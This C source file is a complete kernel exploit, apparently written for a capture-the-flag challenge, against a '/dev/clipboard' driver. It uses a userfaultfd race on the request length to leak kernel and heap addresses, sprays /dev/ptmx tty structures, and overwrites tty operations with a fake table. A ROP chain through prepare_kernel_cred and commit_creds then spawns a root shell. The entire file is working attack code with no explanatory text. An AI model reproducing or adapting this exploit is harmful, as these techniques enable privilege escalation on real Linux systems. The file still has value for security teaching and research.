#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#define CMD_READ 0x4000
#define CMD_WRITE 0x4001
#define MAX_DATA_LEN 0x400

int PAGE_SIZE;

unsigned long kernel_base, clipboard_addr;

void *fault_addr;
unsigned long user_cs, user_rflags, user_rsp, user_ss;

void save_state() {
    asm volatile (
            "mov user_cs, cs\n"
            "mov user_rsp, rsp\n"
            "mov user_ss, ss\n"
            "pushf\n"
            "pop user_rflags\n"
            );
}

typedef struct query {
    int pid;
    unsigned short length;
    char data[MAX_DATA_LEN];
} Query;

void get_shell() {
    printf("[*] Spawning shell\n");
    system("sh");
}

static void *fault_handler_thread(void *arg) {
    static struct uffd_msg msg;
    static int phase;
    struct uffdio_copy uffdio_copy;

    int uffd = (int)arg;

    while (1) {
        struct pollfd pollfd;
        int ready_num;

        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        ready_num = poll(&pollfd, 1, -1);

        if (ready_num == -1) {
            fprintf(stderr, "[!] poll error\n");
            exit(1);
        }

        size_t read_num = read(uffd, &msg, sizeof(msg));
        if (read_num == 0) {
            fprintf(stderr, "[!] EOF on userfaultfd!\n");
            exit(1);
        }
        if (read_num == -1) {
            fprintf(stderr, "[!] read error\n");
            exit(1);
        }
        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "[!] Unexpected event on userfaultfd\n");
            exit(1);
        }

        if (phase == 1) {

            /* Page fault on the first page */

            /*
             *                  query structure
             *               _____________________
             *
             *              .pid  .length  .data
             * [                ][                ]
             *       Page 1            Page 2
             *
             */

            /* set query->length to MAX_DATA_LEN + 0x40 */
            void *data_fault_addr = fault_addr + PAGE_SIZE;
            *(unsigned short *)(data_fault_addr) = MAX_DATA_LEN + 0x40;

            /* set query->pid to current pid */
            void *ptr = malloc(PAGE_SIZE);
            *(pid_t *)(ptr + PAGE_SIZE - 4) = getpid();
            uffdio_copy.src = (unsigned long)ptr;
            uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
            uffdio_copy.len = PAGE_SIZE;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
                fprintf(stderr, "[!] UFFDIO_COPY error\n");
                exit(1);
            }
        } else if (phase == 3) {

            /* ROP gadgets */

            unsigned long commit_creds = kernel_base + 0xc2d90;
            unsigned long prepare_kernel_cred = kernel_base + 0xc3050;
            unsigned long push_rdi_pop_rsp_pop_rbp_ret = kernel_base + 0x631611;
            unsigned long pop_rsp_ret = kernel_base + 0xbc2f0;
            unsigned long pop_rdi_ret = kernel_base + 0x86170;
            unsigned long pop_rcx_ret = kernel_base + 0x1b4397;
            unsigned long mov_rdi_rax_rep_movsq_ret = kernel_base + 0xba6c7b;
            unsigned long kpti_trampoline = kernel_base + 0xc00fe6;

            void *data_fault_addr = fault_addr + PAGE_SIZE * 3;

            /* set query->length to MAX_DATA_LEN + 0x20 */
            *(unsigned short *)(data_fault_addr) = MAX_DATA_LEN + 0x20;

            /* ROP */
            unsigned long *rop = (unsigned long *)(data_fault_addr + 0x2);
            /* The following gadget will turn rsp to a controllable area. */
            rop[0] = push_rdi_pop_rsp_pop_rbp_ret;
            rop[1] = pop_rdi_ret;
            rop[2] = 0x0;
            rop[3] = prepare_kernel_cred;
            rop[4] = pop_rcx_ret;
            rop[5] = 0x0;
            rop[6] = mov_rdi_rax_rep_movsq_ret;
            rop[7] = commit_creds;
            rop[8] = kpti_trampoline;
            rop[9] = 0xdeadbeef;
            rop[10] = 0xdeadbeef;
            rop[11] = (unsigned long)get_shell;
            rop[12] = user_cs;
            rop[13] = user_rflags;
            rop[14] = user_rsp;
            rop[15] = user_ss;

            /* Fake tty_operations */
            unsigned long *tty = (unsigned long *)(data_fault_addr + 0x2 + MAX_DATA_LEN);
            tty[1] = pop_rsp_ret;
            tty[2] = clipboard_addr + 0x8; // new rsp
            tty[3] = clipboard_addr - 0xa8; // overwrite 'ops->flush_buffer' with the 'push rdi ; ...; pop rsp ; ...' gadget

            /* set query->pid to current pid */
            void *ptr = malloc(PAGE_SIZE);
            *(pid_t *)(ptr + PAGE_SIZE - 4) = getpid();
            uffdio_copy.src = (unsigned long)ptr;
            uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
            uffdio_copy.len = PAGE_SIZE;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
                fprintf(stderr, "[!] UFFDIO_COPY error\n");
                exit(1);
            }
        }

        phase++;

        struct uffdio_range range;
        range.start = msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
        range.len = PAGE_SIZE;
        if (ioctl(uffd, UFFDIO_UNREGISTER, &range) == -1) {
            fprintf(stderr, "[!] ioctl UFFDIO_UNREGISTER error\n");
            exit(1);
        }
    }
}

int open_device() {
    int devfd = open("/dev/clipboard", O_RDWR);
    if (devfd < 0) {
        fprintf(stderr, "[!] Cannot open /dev/clipboard\n");
        exit(1);
    }
    return devfd;
}

void heap_spray() {
    int ptmxs[0x80];
    for (int i = 0; i < 0x80; i++) {
        ptmxs[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (ptmxs[i] == -1) {
            printf("[!] Cannot open /dev/ptmx\n");
            exit(1);
        }
    }
    for (int i = 0; i < 0x80; i++) {
        close(ptmxs[i]);
    }
}

void prepare_userfault_pages() {

    int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1) {
        fprintf(stderr, "[!] userfaultfd error in prepare_userfault_fd\n");
        exit(1);
    }

    /* 4 pages */
    fault_addr = mmap(NULL, PAGE_SIZE * 4, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (fault_addr == MAP_FAILED) {
        fprintf(stderr, "[!] mmap\n");
        exit(1);
    }
    printf("[*] address for userfaultfd: %p\n", fault_addr);

    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) {
        fprintf(stderr, "[!] ioctl UFFDIO_API error\n");
        exit(1);
    }

    uffdio_register.range.start = (unsigned long)fault_addr;
    uffdio_register.range.len = PAGE_SIZE * 4;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) {
        fprintf(stderr, "[!] ioctl UFFDIO_REGISTER error\n");
        exit(1);
    }

    pthread_t thr;
    if (pthread_create(&thr, NULL, fault_handler_thread, (void *)uffd) != 0) {
        fprintf(stderr, "[!] pthread_create error\n");
        exit(1);
    }
}

void read_device(int devfd, Query *query) {
    int ret = ioctl(devfd, CMD_READ, query);
    printf("[*] Read %d bytes\n", ret);
}

void write_device(int devfd, Query *query) {
    int ret = ioctl(devfd, CMD_WRITE, query);
    printf("[*] Write %d bytes\n", ret);
}

int main() {
    PAGE_SIZE = sysconf(_SC_PAGE_SIZE);

    heap_spray();
    int devfd = open_device();
    prepare_userfault_pages();
    save_state();

    /* Set length to 1 */
    Query *normal_query = (Query *)malloc(sizeof(Query));
    normal_query->pid = getpid();
    normal_query->length = 1;
    normal_query->data[0] = 'A';

    write_device(devfd, normal_query);

    /* Leak kernel address & heap address */
    Query *fault_query_read = (Query *)(fault_addr + PAGE_SIZE - 0x4);
    read_device(devfd, fault_query_read);
    unsigned long kernel_leak = *(unsigned long *)(fault_query_read->data + MAX_DATA_LEN + 0x18);
    kernel_base = (kernel_leak - 0x10a9be0) & ~0xfffff;

    unsigned long kernel_heap_leak = *(unsigned long *)(fault_query_read->data + MAX_DATA_LEN + 0x38);
    clipboard_addr = kernel_heap_leak - 0x438;

    printf("[*] Kernel base = %p\n", kernel_base);
    printf("[*] Clipboard address = %p\n", clipboard_addr);

    /* Overwrite ptmx->ops */
    int ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    if (ptmx == -1) {
        printf("Cannot open /dev/ptmx\n");
        exit(1);
    }

    Query *fault_query_write = (Query *)(fault_addr + PAGE_SIZE * 3 - 0x4);
    write_device(devfd, fault_query_write);

    /* trigger rop gadget */
    close(ptmx);

    /* Try again if the chunk of clipboard data isn't released from 'tty_struct' */
    /* Or, the chunk next to clipboard data isn't 'tty_struct' */
    close(devfd);
    printf("[!] Try again\n");
}
